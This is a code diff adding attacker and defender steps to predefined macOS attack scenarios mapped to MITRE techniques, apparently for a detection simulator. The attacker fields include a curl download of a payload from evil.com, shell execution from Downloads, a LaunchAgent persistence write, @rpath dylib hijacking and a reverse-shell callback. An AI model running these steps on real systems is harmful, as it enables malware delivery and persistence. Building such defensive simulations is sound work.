@@ -25,6 +25,14 @@ export const PREDEFINED_SCENARIOS: AttackScenario[] = [
         order: 1,
         description: 'Safari downloads a suspicious binary to ~/Downloads.',
         mitre_mapping: { tactic: 'Initial Access', technique_id: 'T1566.002', technique_name: 'Phishing: Spearphishing Link' },
+        attacker_thought_before: "I've sent a spear-phishing link to the user. Hopefully, they download the 'Update.zip'.",
+        attacker_command: "curl -L http://evil.com/Update.zip -o ~/Downloads/Update.zip",
+        attacker_output: "Download complete. File saved to ~/Downloads/Update.zip",
+        attacker_thought_after: "Successfully landed the payload. Now I just need the user to execute it.",
+        defender_thought_before: "Monitoring for web-initiated downloads of executable types or archives that bypass Gatekeeper.",
+        defender_command: "mdfind 'kMDItemFSName == \"Update.zip\"' | grep Downloads",
+        defender_output: "/Users/user/Downloads/Update.zip found with quarantine bit set.",
+        defender_thought_after: "Quarantine extended attributes detected. System will prompt user on execution.",
         expected_signals: [
           { event_type: 'file_create', category: 'file_system', description: 'File created in Downloads directory', process_name: 'com.apple.Safari' }
         ]
@@ -34,6 +42,14 @@ export const PREDEFINED_SCENARIOS: AttackScenario[] = [
         order: 2,
         description: 'User executes the binary, which spawns a shell.',
         mitre_mapping: { tactic: 'Execution', technique_id: 'T1059.004', technique_name: 'Command and Scripting Interpreter: Unix Shell' },
+        attacker_thought_before: "User has bypassed the prompt. I'm executing the second stage to gain interactive shell access.",
+        attacker_command: "chmod +x ~/Downloads/Update/malicious_bin && ~/Downloads/Update/malicious_bin",
+        attacker_output: "Process started. Shell spawned. PID: 6712",
+        attacker_thought_after: "I have local execution. Time to secure my foothold.",
+        defender_thought_before: "Detecting execution of unsigned binaries or processes spawning interactive shells from suspicious paths.",
+        defender_command: "eslogger exec | grep Downloads",
+        defender_output: "ES_EVENT_TYPE_NOTIFY_EXEC: malicious_bin (pid: 6712) spawned from /Users/user/Downloads/",
+        defender_thought_after: "ALERT: Execution from Downloads directory detected. Flagging pid 6712 for telemetry escalation.",
         expected_signals: [
           { event_type: 'process_exec', category: 'execution', description: 'Execution of unsigned binary', command_line: './malicious_bin' }
         ]
@@ -43,6 +59,14 @@ export const PREDEFINED_SCENARIOS: AttackScenario[] = [
         order: 3,
         description: 'Malicious process creates a LaunchAgent for persistence.',
         mitre_mapping: { tactic: 'Persistence', technique_id: 'T1543.001', technique_name: 'Create or Modify System Process: Launch Agent' },
+        attacker_thought_before: "I need to survive a reboot. A LaunchAgent in the user's Library is the easiest path.",
+        attacker_command: "mkdir -p ~/Library/LaunchAgents && echo '...' > ~/Library/LaunchAgents/com.malware.plist",
+        attacker_output: "LaunchAgent plist written. Persistence configured for next login.",
+        attacker_thought_after: "Foothold secured. I can now disconnect and wait for the system to cycle.",
+        defender_thought_before: "Monitoring for file writes to the LaunchAgents directory by non-system processes.",
+        defender_command: "eslogger write | grep LaunchAgents",
+        defender_output: "ES_EVENT_TYPE_NOTIFY_WRITE: com.malware.plist (pid: 6712)",
+        defender_thought_after: "CRITICAL: Malicious LaunchAgent detected. Adding to quarantine and blocking persistent execution.",
         expected_signals: [
           { event_type: 'file_write', category: 'persistence', description: 'Plist created in ~/Library/LaunchAgents', file_path: '~/Library/LaunchAgents/com.malware.plist' }
         ]
@@ -60,6 +84,14 @@ export const PREDEFINED_SCENARIOS: AttackScenario[] = [
         order: 1,
         description: 'Attacker identifies a vulnerable application with @rpath vulnerabilities.',
         mitre_mapping: { tactic: 'Discovery', technique_id: 'T1083', technique_name: 'File and Directory Discovery' },
+        attacker_thought_before: "I need to find an application that loads dynamic libraries using relative paths (@rpath). This is a classic entry point for injection.",
+        attacker_command: "find /Applications -name '*.app' -maxdepth 2 -exec otool -l {}/Contents/MacOS/* 2>/dev/null | grep -B 1 -A 10 LC_RPATH",
+        attacker_output: "LC_RPATH\n  path @executable_path/../Frameworks (offset 12)\n--\nLC_LOAD_DYLIB\n  name @rpath/libSecurityLogic.dylib (offset 24)",
+        attacker_thought_after: "Found 'SecureApp.app'. It loads 'libSecurityLogic.dylib' from a relative path. If I can place my own dylib there, I win.",
+        defender_thought_before: "Baseline check: Monitoring system for unusual otool or nm usage on application bundles.",
+        defender_command: "eslogger exec | grep otool",
+        defender_output: "ES_EVENT_TYPE_NOTIFY_EXEC: otool (pid: 4521) triggered by user 'investigator'",
+        defender_thought_after: "Standard developer behavior detected, but keeping an eye on the pid 4521 for subsequent file writes.",
         expected_signals: [
           { event_type: 'process_exec', category: 'execution', description: 'otool or nm used to inspect binary', process_name: 'otool' }
         ]
@@ -69,6 +101,14 @@ export const PREDEFINED_SCENARIOS: AttackScenario[] = [
         order: 2,
         description: 'Malicious dylib is placed in the expected @rpath location.',
         mitre_mapping: { tactic: 'Persistence', technique_id: 'T1574.002', technique_name: 'Hijack Execution Flow: DLL Side-Loading' },
+        attacker_thought_before: "Now I'll craft a malicious dylib that spawns a reverse shell on load and drop it into the Frameworks folder.",
+        attacker_command: "cp /tmp/evil.dylib /Applications/SecureApp.app/Contents/Frameworks/libSecurityLogic.dylib",
+        attacker_output: "File copied successfully. Permissions set to 755.",
+        attacker_thought_after: "Persistence established. The legitimate application is now weaponized.",
+        defender_thought_before: "Integrity check: Monitoring Writes to sensitive application bundle locations.",
+        defender_command: "eslogger create | grep .dylib",
+        defender_output: "ES_EVENT_TYPE_NOTIFY_CREATE: libSecurityLogic.dylib (path: /Applications/SecureApp.app/Contents/Frameworks/)",
+        defender_thought_after: "Unusual dylib creation in a signed application bundle. This is highly suspicious.",
         expected_signals: [
           { event_type: 'file_create', category: 'file_system', description: 'Dylib dropped in application bundle', file_path: 'Contents/Frameworks/lib.dylib' }
         ]
@@ -78,6 +118,14 @@ export const PREDEFINED_SCENARIOS: AttackScenario[] = [
         order: 3,
         description: 'Legitimate application loads the malicious dylib on startup.',
         mitre_mapping: { tactic: 'Execution', technique_id: 'T1574.002', technique_name: 'Hijack Execution Flow: DLL Side-Loading' },
+        attacker_thought_before: "Time to wait for the user to open the app. The dynamic linker (dyld) will do the work for me.",
+        attacker_command: "open /Applications/SecureApp.app",
+        attacker_output: "Application initialized. Library loaded. Callback received: 192.168.1.50:4444",
+        attacker_thought_after: "Payload successfully executed inside the context of a trusted Apple-signed process. TCC bypass highly likely.",
+        defender_thought_before: "Monitoring for image loads from non-standard or recently modified paths.",
+        defender_command: "eslogger mmap | grep SecureApp",
+        defender_output: "ES_EVENT_TYPE_NOTIFY_MMAP: SecureApp (pid: 5102) loaded libSecurityLogic.dylib (UNSIGNED)",
+        defender_thought_after: "ALERT: Signed binary loaded an unsigned library. Initiating process termination and quarantine.",
         expected_signals: [
           { event_type: 'image_load', category: 'execution', description: 'Malicious dylib loaded by signed process', process_name: 'TargetApp' }
         ]
